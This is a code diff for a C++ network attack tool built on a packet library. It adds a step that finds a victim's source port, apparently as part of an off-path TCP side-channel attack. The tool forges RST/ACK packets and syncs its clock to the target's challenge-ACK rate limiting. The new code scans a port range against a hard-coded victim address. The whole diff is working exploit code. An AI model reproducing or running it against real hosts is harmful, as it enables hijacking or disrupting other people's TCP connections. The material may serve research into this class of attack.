@@ -5,6 +5,7 @@
 
 #include "common.h"
 #include "packet_counter.h"
+#include "port_finder.h"
 
 using namespace std;
 using namespace std::chrono_literals;
@@ -56,7 +57,7 @@ pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
 milliseconds synchronizeClock(const ConnectionID& legitConn, int legitLastSeq) {
     Tins::PacketSender sender;
     
-    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3, "C");    
+    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3);    
     auto pcounter = PacketCounter::instance();
 
     uint32_t n1, n2;
@@ -104,7 +105,7 @@ milliseconds synchronizeClock(const ConnectionID& legitConn, int legitLastSeq) {
 void testClock(const ConnectionID& legitConn, int legitLastSeq, milliseconds delayMs) {
     auto pcounter = PacketCounter::instance();
     Tins::PacketSender sender;
-    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3, "C");    
+    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3);
     for (int c = 0; c < 5; c++) {
         pcounter->startCounting();
         auto s = align_and_delay(delayMs);
@@ -114,7 +115,7 @@ void testClock(const ConnectionID& legitConn, int legitLastSeq, milliseconds del
             s += 5ms;
             this_thread::sleep_until(system_clock::time_point(s));
         }
-        this_thread::sleep_for(3s);
+        this_thread::sleep_for(2s);
 
         auto result = pcounter->stopCounting();
         cout << "Delay until: " << s.count() << "ms. ";
@@ -130,6 +131,18 @@ int main() {
     cout << "Got legit connection info: " << legitConn.toString() << " " << legitLastSeq << endl;
 
     printHeader("SYNCHRONIZING CLOCK...");
-    auto delayMs = synchronizeClock(legitConn, legitLastSeq);
-    cout << "Delay: " << delayMs.count() << "ms" << endl;
+    auto syncDelayMs = synchronizeClock(legitConn, legitLastSeq);
+    cout << "Synchronization delay: " << syncDelayMs.count() << "ms" << endl;
+
+    printHeader("FINDING VICTIM'S PORT...");
+    PortFinder portFinder(legitConn, legitLastSeq, "192.168.1.103");
+    portFinder.setSyncDelayMs(syncDelayMs);
+    try {
+        auto victimPort = portFinder.find(32000, 38000);
+        cout << "Victim's port: " << victimPort << endl;
+    } catch (char const* err) {
+        cout << "Error: " << err << endl;
+        return 1;
+    }
+    return 0;
 }
